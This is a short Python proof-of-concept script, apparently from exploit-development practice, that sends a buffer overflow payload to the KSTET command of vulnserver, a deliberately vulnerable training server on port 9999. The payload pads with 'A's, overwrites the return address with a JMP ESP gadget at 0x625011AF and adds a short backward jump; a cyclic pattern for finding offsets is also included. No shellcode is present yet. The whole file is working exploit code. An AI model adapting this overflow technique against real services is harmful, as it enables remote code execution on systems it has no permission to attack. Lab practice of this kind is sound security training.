import sys
import socket


# Fuzzing/poc vulnserver

evilString = "A" * 256

cyclic_pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"


#625011AF
JMP_ESP = "\xaf\x11\x50\x62"
#EBB8
JMP_70_BACK = "\xEB\xB8" # Nasm Shell

#evilString = cyclic_pattern
evilString = "A"*70 + JMP_ESP + JMP_70_BACK + "C"*(256-4-7-4)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

command2 = "KSTET " + evilString

s.connect(('xxx.xxx.xxx.xxx', 9999))
s.recv(1024)
s.send(command2)
s.close()
